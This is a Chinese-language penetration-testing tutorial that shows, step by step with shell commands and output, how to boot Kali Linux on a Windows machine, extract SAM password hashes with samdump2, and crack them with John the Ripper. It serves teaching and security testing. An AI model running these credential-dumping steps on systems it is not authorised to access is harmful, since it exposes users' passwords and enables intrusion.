#破解Windows用户密码

Windows系统的用户名和密码保存在SAM（安全账号管理器）文件中。在基于NT内核的Windows系统中，
包括Windows 2000及后续版本，这个文件保存在“C:\Windows\System32\Config”目录下。
出于安全原因，微软特定添加了一些额外的安全措施将该文件保护了起来。
首先，操作系统启动之后，SAM文件将同时被锁定。这意味着操作系统运行之时，
用户无法打开或复制SAM文件。除了锁定，整个SAM文件还经过加密，且不可见。

幸运的是，现在有办法绕过这些限制。在远程计算机上，只要目标处于运行状态，
就可以利用Meterpreter和SAM Juicer获取计算机上的散列文件。
获得访问系统的物理权限之后，用户就可以在其上启动其他的操作系统，
如在USB或DVD-ROM设备上的Kali Linux。启动目标计算机进入到其他的操作系统之后，
用户可以使用Kali中的John the Ripper工具来破解该Windows用户密码。

使用John the Ripper工具破解Windows用户密码。具体操作步骤如下所示。

（1）检查当前系统中的硬盘驱动。执行命令如下所示：
```shell script
fdisk -l
```
输出的信息表示当前系统中有一块磁盘，并只有一个分区。该文件系统类型是NTFS，也是Windows系统的所存放的磁盘。

（2）挂载硬盘驱动。执行命令如下所示：
```shell script
mkdir /sda1     #创建挂载点
mount /dev/sda1 /sda1/   #挂载/dev/sda1分区，到刚创建的挂载点下
```
执行以上命令后，没有任何输出信息。

（3）切换目录，进入到Windows SAM文件的位置。执行命令如下所示：
```shell script
cd /sda1/WINDOWS/system32/config/
```
在该目录中，可以看到SAM文件。

（4）使用SamDump2提取SAM文件。执行命令如下所示：
```shell script
[root@kali]:/sda1/WINDOWS/system32/config# samdump2 SAM system > /root/hash.txt 

samdump2 1.1.1 by Objectif Securite
http://www.objectif-securite.ch
original author: [root@kali]
Root Key : SAM
```
从输出信息中可以看到提取了SAM文件。将该文件的内容重定向到了/root/hash.txt文件中。

（5）运行john命令，实现密码攻击。执行命令如下所示：
```shell script
[root@kali]:/sda1/WINDOWS/system32/config# /usr/sbin/john /root/hash.txt --format=nt

Created directory: /root/.john
Loaded 6 password hashes with no different salts (NT MD4 [128/128 SSE2 + 32/32])
   (Guest)
guesses: 4 time: 0:00:03:13 0.09% (3) (ETA: Mon May 12 06:46:42 2014) c/s: 152605K trying: 2KRIN.P - 2KRIDY8
guesses: 4 time: 0:00:04:26 0.13% (3) (ETA: Mon May 12 04:02:53 2014) c/s: 152912K trying: GR0KUHI - GR0KDN1
guesses: 4 time: 0:00:04:27 0.13% (3) (ETA: Mon May 12 04:15:42 2014) c/s: 152924K trying: HKCUUHT - HKCUGDS
```